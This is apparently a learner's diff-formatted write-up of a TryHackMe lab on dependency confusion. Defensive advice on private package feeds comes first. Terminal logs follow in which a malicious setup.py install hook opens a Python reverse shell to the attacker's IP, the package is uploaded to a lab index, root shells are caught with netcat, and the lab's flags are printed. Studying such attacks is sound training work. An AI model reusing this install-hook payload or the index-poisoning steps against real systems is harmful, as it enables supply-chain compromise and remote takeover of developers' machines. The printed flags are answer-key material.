@@ -446,3 +446,452 @@ Protecting internal dependencies is a massive security endeavour. Since we have 
 -   Internal dependencies should be actively maintained. This will ensure that vulnerabilities in these dependencies do not affect multiple applications and services.
 -   The hosting infrastructure of internal dependencies should be secured. The following [Microsoft whitepaper](https://azure.microsoft.com/mediahandler/files/resourcefiles/3-ways-to-mitigate-risk-using-private-package-feeds/3%20Ways%20to%20Mitigate%20Risk%20When%20Using%20Private%20Package%20Feeds%20-%20v1.0.pdf) provides the following three key focus areas:
 -   Reference one private feed, not multiple. This contributes to protecting against dependency confusion attacks. With our python example, we would then use `--index-url` argument instead of `--extra-index-url` to indicate that the package must be collected from the specified index.
+-   Protect your packages using controlled scopes. By controlling the scopes of dependencies, it will ensure that dependencies are locked to the applications that require them.
+-   Utilise client-side verification features. Controls such as sub-resource integrity or version locking will ensure that applications and services will detect when malicious code is introduced into a dependency and refuse to execute it.
+-   As an additional defence measure against dependency confusion attacks, the names of internal dependencies can be registered on external package managers without the source code to claim the name. This will prevent an attacker from registering a similarly named package.
+Answer the questions below
+```text
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sudo bash -c "echo '10.10.68.245 external.pypi-server.loc' >> /etc/hosts"
+[sudo] password for witty: 
+                                                                                   
+┌──(witty㉿kali)-[~/Downloads]
+└─$ tail /etc/hosts
+127.0.1.1	kali
+::1		localhost ip6-localhost ip6-loopback
+ff02::1		ip6-allnodes
+ff02::2		ip6-allrouters
+
+#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca
+
+127.0.0.1 irc.cct
+10.10.92.0 cdn.tryhackme.loc
+10.10.68.245 external.pypi-server.loc
+
+A build server is a dedicated computer or server that is responsible for building software, typically from source code. It compiles the code, runs any necessary tests, and creates the final executable or software package that is ready to be deployed to other servers or client machines.
+
+Docker Compose, on the other hand, is a tool for defining and running multi-container Docker applications. It allows you to define a set of Docker containers and their dependencies in a single configuration file, making it easier to manage and deploy complex applications. With Docker Compose, you can spin up multiple containers with a single command, define their networking and storage requirements, and manage their lifecycle as a single application.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ curl http://10.10.68.245:8181/api/list
+{"message":"Accepted","values":[1,2,3,4,5,6,7,8,9,10]}
+
+`twine upload dist/datadbconnect-0.0.2.tar.gz` is a command used to upload a Python package to the Python Package Index (PyPI) using Twine.
+
+Here's what each part of the command means:
+
+-   `twine`: the command-line tool used to upload Python packages to PyPI
+-   `upload`: the subcommand that tells Twine to upload a package
+-   `dist/datadbconnect-0.0.2.tar.gz`: the path to the package that you want to upload. This assumes that the package has already been built and saved to the `dist` directory using the `python setup.py sdist` command.
+
+When you run this command, Twine will prompt you for your PyPI username and password, and then it will upload the package to PyPI. Once the upload is complete, the package will be available for other users to install using the `pip` package manager.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ mkdir confusion_dependency
+                                                                                   
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cd confusion_dependency 
+                                                                                   
+┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
+└─$ nano main.py
+                                                                                   
+┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
+└─$ cat main.py            
+#!/usr/bin/python3
+def main():
+   print ("Hello World")
+
+if __name__=="__main__":
+   main()
+
+real version
+
+┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
+└─$ nano setup.py     
+                                                                                   
+┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
+└─$ cat setup.py 
+from setuptools import find_packages
+from setuptools import setup
+
+VERSION = 'v0.0.1'
+ 
+setup(
+        name='datadbconnect',
+        url='https://github.com/labs/datadbconnect/',
+        download_url='https://github.com/labs/datadbconnect/archive/{}.tar.gz'.format(VERSION),
+        author='Tinus Green',
+        author_email='tinus@notmyrealemail.com',
+        version=VERSION,
+        packages=find_packages(),
+        include_package_data=True,
+        license='MIT',
+        description=('''Dataset Connection Package '''
+                  '''that can be used internally to connect to data sources '''),
+
+rce version
+
+┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
+└─$ nano setup.py 
+                                                                                   
+┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
+└─$ cat setup.py 
+from setuptools import find_packages
+from setuptools import setup
+from setuptools.command.install import install
+import os
+import sys
+
+VERSION = 'v9000.0.2'
+
+class PostInstallCommand(install):
+     def run(self):
+         install.run(self)
+         print ("Hello World from installer, this proves our injection works")
+         os.system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')
+
+setup(
+        name='datadbconnect',
+        url='https://github.com/labs/datadbconnect/',
+        download_url='https://github.com/labs/datadbconnect/archive/{}.tar.gz'.format(VERSION),
+        author='Tinus Green',
+        author_email='tinus@notmyrealemail.com',
+        version=VERSION,
+        packages=find_packages(),
+        include_package_data=True,
+        license='MIT',
+        description=('''Dataset Connection Package '''
+                  '''that can be used internally to connect to data sources '''),
+        cmdclass={
+            'install': PostInstallCommand
+        },
+)
+
+┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
+└─$ python3 setup.py sdist
+/usr/lib/python3/dist-packages/setuptools/dist.py:529: UserWarning: Normalizing 'v9000.0.2' to '9000.0.2'
+  warnings.warn(tmpl.format(**locals()))
+running sdist
+running egg_info
+creating datadbconnect.egg-info
+writing datadbconnect.egg-info/PKG-INFO
+writing dependency_links to datadbconnect.egg-info/dependency_links.txt
+writing top-level names to datadbconnect.egg-info/top_level.txt
+writing manifest file 'datadbconnect.egg-info/SOURCES.txt'
+reading manifest file 'datadbconnect.egg-info/SOURCES.txt'
+writing manifest file 'datadbconnect.egg-info/SOURCES.txt'
+warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md
+
+running check
+creating datadbconnect-9000.0.2
+creating datadbconnect-9000.0.2/datadbconnect.egg-info
+copying files to datadbconnect-9000.0.2...
+copying setup.py -> datadbconnect-9000.0.2
+copying datadbconnect.egg-info/PKG-INFO -> datadbconnect-9000.0.2/datadbconnect.egg-info
+copying datadbconnect.egg-info/SOURCES.txt -> datadbconnect-9000.0.2/datadbconnect.egg-info
+copying datadbconnect.egg-info/dependency_links.txt -> datadbconnect-9000.0.2/datadbconnect.egg-info
+copying datadbconnect.egg-info/top_level.txt -> datadbconnect-9000.0.2/datadbconnect.egg-info
+Writing datadbconnect-9000.0.2/setup.cfg
+creating dist
+Creating tar archive
+removing 'datadbconnect-9000.0.2' (and everything under it)
+
+┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
+└─$ ls
+datadbconnect.egg-info  dist  main.py  setup.py
+
+┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
+└─$ twine upload dist/datadbconnect-9000.0.2.tar.gz --repository-url http://external.pypi-server.loc:8080
+Uploading distributions to http://external.pypi-server.loc:8080
+Enter your username: 
+WARNING  Your username is empty. Did you enter it correctly?                       
+WARNING  See https://twine.readthedocs.io/#entering-credentials for more           
+         information.                                                              
+Enter your password: 
+WARNING  Your password is empty. Did you enter it correctly?                       
+WARNING  See https://twine.readthedocs.io/#entering-credentials for more           
+         information.                                                              
+Uploading datadbconnect-9000.0.2.tar.gz
+100% ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.0/4.0 kB • 00:00 • ?
+
+──(witty㉿kali)-[~/Downloads]
+└─$ pip3 install datadbconnect --trusted-host external.pypi-server.loc --index-url http://external.pypi-server.loc:8080 --verbose
+Using pip 23.0 from /usr/local/lib/python3.11/dist-packages/pip (python 3.11)
+Defaulting to user installation because normal site-packages is not writeable
+Looking in indexes: http://external.pypi-server.loc:8080
+Collecting datadbconnect
+  Downloading http://external.pypi-server.loc:8080/packages/datadbconnect-9000.0.2.tar.gz (1.3 kB)
+  Running command python setup.py egg_info
+  /usr/lib/python3/dist-packages/setuptools/dist.py:529: UserWarning: Normalizing 'v9000.0.2' to '9000.0.2'
+    warnings.warn(tmpl.format(**locals()))
+  running egg_info
+  creating /tmp/pip-pip-egg-info-qwbb3cpy/datadbconnect.egg-info
+  writing /tmp/pip-pip-egg-info-qwbb3cpy/datadbconnect.egg-info/PKG-INFO
+  writing dependency_links to /tmp/pip-pip-egg-info-qwbb3cpy/datadbconnect.egg-info/dependency_links.txt
+  writing top-level names to /tmp/pip-pip-egg-info-qwbb3cpy/datadbconnect.egg-info/top_level.txt
+  writing manifest file '/tmp/pip-pip-egg-info-qwbb3cpy/datadbconnect.egg-info/SOURCES.txt'
+  reading manifest file '/tmp/pip-pip-egg-info-qwbb3cpy/datadbconnect.egg-info/SOURCES.txt'
+  writing manifest file '/tmp/pip-pip-egg-info-qwbb3cpy/datadbconnect.egg-info/SOURCES.txt'
+  Preparing metadata (setup.py) ... done
+Building wheels for collected packages: datadbconnect
+  Running command python setup.py bdist_wheel
+  /usr/lib/python3/dist-packages/setuptools/dist.py:529: UserWarning: Normalizing 'v9000.0.2' to '9000.0.2'
+    warnings.warn(tmpl.format(**locals()))
+  running bdist_wheel
+  running build
+  /usr/lib/python3/dist-packages/setuptools/command/install.py:34: SetuptoolsDeprecationWarning: setup.py install is deprecated. Use build and pip and other standards-based tools.
+    warnings.warn(
+  installing to build/bdist.linux-x86_64/wheel
+  running install
+  running install_egg_info
+  running egg_info
+  writing datadbconnect.egg-info/PKG-INFO
+  writing dependency_links to datadbconnect.egg-info/dependency_links.txt
+  writing top-level names to datadbconnect.egg-info/top_level.txt
+  reading manifest file 'datadbconnect.egg-info/SOURCES.txt'
+  writing manifest file 'datadbconnect.egg-info/SOURCES.txt'
+  Copying datadbconnect.egg-info to build/bdist.linux-x86_64/wheel/datadbconnect-9000.0.2.egg-info
+  running install_scripts
+  Hello World from installer, this proves our injection works
+
+┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
+└─$ rlwrap nc -lvnp 8080
+listening on [any] 8080 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.68.245] 55124
+/bin/sh: 0: can't access tty; job control turned off
+```
+```text
+# whoami
+root
+```
+```text
+# ls
+PKG-INFO
+build
+datadbconnect.egg-info
+pip-delete-this-directory.txt
+pip-egg-info
+setup.cfg
+setup.py
+```
+```text
+# cd /root
+```
+```text
+# ls
+flag.txt
+```
+```text
+# cat flag.txt
+THM{RCE.Through.Dependency.Confusion}
+```
+```text
+# cd /
+```
+```text
+# ls -lah
+total 76K
+drwxr-xr-x   1 root root 4.0K Feb 22 21:52 .
+drwxr-xr-x   1 root root 4.0K Feb 22 21:52 ..
+-rwxr-xr-x   1 root root    0 Feb 22 21:52 .dockerenv
+drwxr-xr-x   2 root root 4.0K Aug  1  2022 bin
+drwxr-xr-x   2 root root 4.0K Apr 24  2018 boot
+drwxr-xr-x   5 root root  340 Feb 22 21:52 dev
+drwxr-xr-x   1 root root 4.0K Feb 22 21:52 etc
+drwxr-xr-x   2 root root 4.0K Apr 24  2018 home
+drwxr-xr-x   1 root root 4.0K Aug  9  2022 lib
+drwxr-xr-x   2 root root 4.0K Aug  1  2022 lib64
+drwxr-xr-x   2 root root 4.0K Aug  1  2022 media
+drwxr-xr-x   2 root root 4.0K Aug  1  2022 mnt
+drwxr-xr-x   2 root root 4.0K Aug  1  2022 opt
+dr-xr-xr-x 137 root root    0 Feb 22 21:52 proc
+drwx------   1 root root 4.0K Aug  9  2022 root
+drwxr-xr-x   5 root root 4.0K Aug  1  2022 run
+drwxr-xr-x   2 root root 4.0K Aug  1  2022 sbin
+drwxr-xr-x   2 root root 4.0K Aug  1  2022 srv
+dr-xr-xr-x  13 root root    0 Feb 22 21:52 sys
+drwxrwxrwt   1 root root 4.0K Feb 22 21:53 tmp
+drwxr-xr-x   1 root root 4.0K Aug  1  2022 usr
+drwxr-xr-x   1 root root 4.0K Aug  1  2022 var
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ pip3 uninstall datadbconnect
+
+Found existing installation: datadbconnect 9000.0.2
+Uninstalling datadbconnect-9000.0.2:
+  Would remove:
+    /home/witty/.local/lib/python3.11/site-packages/datadbconnect-9000.0.2.dist-info/*
+Proceed (Y/n)? Y
+  Successfully uninstalled datadbconnect-9000.0.2
+
+┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
+└─$ rlwrap nc -lvnp 8080
+listening on [any] 8080 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.68.245] 55166
+/bin/sh: 0: can't access tty; job control turned off
+```
+```text
+# ls
+PKG-INFO
+build
+datadbconnect.egg-info
+pip-delete-this-directory.txt
+pip-egg-info
+setup.cfg
+setup.py
+```
+```text
+# cat pip-delete-this-directory.txt
+This file is placed here by pip to indicate the source was put
+here by pip.
+
+Once this package is successfully installed this source code will be
+deleted (unless you remove this file).
+```
+```text
+# cat setup.py
+from setuptools import find_packages
+from setuptools import setup
+from setuptools.command.install import install
+import os
+import sys
+
+VERSION = 'v9000.0.2'
+
+class PostInstallCommand(install):
+     def run(self):
+         install.run(self)
+         print ("Hello World from installer, this proves our injection works")
+         os.system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')
+
+setup(
+        name='datadbconnect',
+        url='https://github.com/labs/datadbconnect/',
+        download_url='https://github.com/labs/datadbconnect/archive/{}.tar.gz'.format(VERSION),
+        author='Tinus Green',
+        author_email='tinus@notmyrealemail.com',
+        version=VERSION,
+        packages=find_packages(),
+        include_package_data=True,
+        license='MIT',
+        description=('''Dataset Connection Package '''
+                  '''that can be used internally to connect to data sources '''),
+        cmdclass={
+            'install': PostInstallCommand
+        },
+)
+```
+What is the name of the attack that can be launched to create a race condition between internal and external dependencies with the same name?
+*Dependency Confusion*
+What is the flag's value that is stored in the /root/ directory on the docker container where you get remote code execution?
+### Conclusion
+In this room, we discussed the security controls and misconfigurations commonly found with dependency management. This is by no means an exhaustive list of what should be considered for the security of dependencies. However, to summarise, we should be considering the following:
+-   Be aware of the dependencies you use in your applications and systems. Also, be aware that these dependencies may have dependencies, which will grow the list of dependencies you will need to keep tabs on.
+-   Make sure to always use the latest versions of dependencies, both internal and external dependencies. More often than not, these updates to dependencies are not to introduce new features but to fix existing issues and bugs.
+-   It is not just the dependencies themselves that should be considered for security, but also how we configure and use our dependency managers, especially for internal dependencies.
+-   Dependencies and dependency management systems should be included in the attack surface of the application or system we are developing.
+Answer the questions below
+I understand that security should be taken seriously for dependencies and dependency management in the DevOps pipeline.
+Question Done
+```text
+root@ip-10-10-183-87:~# pip3 install datadbconnect --trusted-host external.pypi-server.loc --index-url http://external.pypi-server.loc:8080 --verbose
+Using pip 22.1 from /usr/local/lib/python3.9/dist-packages/pip (python 3.9)
+Looking in indexes: http://external.pypi-server.loc:8080
+Collecting datadbconnect
+  Downloading http://external.pypi-server.loc:8080/packages/datadbconnect-9000.0.2.tar.gz (1.3 kB)
+  Running command python setup.py egg_info
+  /usr/local/lib/python3.9/dist-packages/setuptools/dist.py:526: UserWarning: Normalizing 'v9000.0.2' to '9000.0.2'
+    warnings.warn(tmpl.format(**locals()))
+  running egg_info
+  creating /tmp/pip-pip-egg-info-o1bcv45w/datadbconnect.egg-info
+  writing /tmp/pip-pip-egg-info-o1bcv45w/datadbconnect.egg-info/PKG-INFO
+  writing dependency_links to /tmp/pip-pip-egg-info-o1bcv45w/datadbconnect.egg-info/dependency_links.txt
+  writing top-level names to /tmp/pip-pip-egg-info-o1bcv45w/datadbconnect.egg-info/top_level.txt
+  writing manifest file '/tmp/pip-pip-egg-info-o1bcv45w/datadbconnect.egg-info/SOURCES.txt'
+  reading manifest file '/tmp/pip-pip-egg-info-o1bcv45w/datadbconnect.egg-info/SOURCES.txt'
+  writing manifest file '/tmp/pip-pip-egg-info-o1bcv45w/datadbconnect.egg-info/SOURCES.txt'
+  Preparing metadata (setup.py) ... done
+Building wheels for collected packages: datadbconnect
+  Running command python setup.py bdist_wheel
+  /usr/local/lib/python3.9/dist-packages/setuptools/dist.py:526: UserWarning: Normalizing 'v9000.0.2' to '9000.0.2'
+    warnings.warn(tmpl.format(**locals()))
+  running bdist_wheel
+  running build
+  /usr/local/lib/python3.9/dist-packages/setuptools/command/install.py:34: SetuptoolsDeprecationWarning: setup.py install is deprecated. Use build and pip and other standards-based tools.
+    warnings.warn(
+  installing to build/bdist.linux-x86_64/wheel
+  running install
+  running install_egg_info
+  running egg_info
+  writing datadbconnect.egg-info/PKG-INFO
+  writing dependency_links to datadbconnect.egg-info/dependency_links.txt
+  writing top-level names to datadbconnect.egg-info/top_level.txt
+  reading manifest file 'datadbconnect.egg-info/SOURCES.txt'
+  writing manifest file 'datadbconnect.egg-info/SOURCES.txt'
+  Copying datadbconnect.egg-info to build/bdist.linux-x86_64/wheel/datadbconnect-9000.0.2-py3.9.egg-info
+  running install_scripts
+  Hello World from installer, this proves our injection works
+  
+┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
+└─$ rlwrap nc -lvnp 8080
+listening on [any] 8080 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.183.87] 40756
+```
+```text
+# ls
+build
+datadbconnect.egg-info
+PKG-INFO
+setup.cfg
+setup.py
+```
+```text
+# cd /root
+```
+```text
+# ls
+Desktop
+Downloads
+Instructions
+Pictures
+Postman
+Rooms
+Scripts
+thinclient_drives
+Tools
+```
+```text
+# cd Rooms
+```
+```text
+# ls
+ADEnumeration
+AoC3
+BPVolatility
+BreachingAD
+cryptographyintro
+ctf-event-2022
+CVE2022-26134
+CVE2022-26923
+ExploitingAD
+Follina-MSDT
+introdigitalforensics
+OhSINT
+sigma
+solar
+SplunkBasic
+Spring4Shell
+Wireshark101
+
+Works !
+```
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/e7c88e060a4f574ca216a94eecf0408b.png)
+- ***THM{Supply.Chain.Attacks.Are.Super.Powerful}***
+- ![Diagram for showing dependency confusion](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/32b158ecec6d8ed7fbad6d97630cc414.png)
+- ***THM{RCE.Through.Dependency.Confusion}***
+
+## Notes / Lessons Learned
+[[CCT2019]]
+
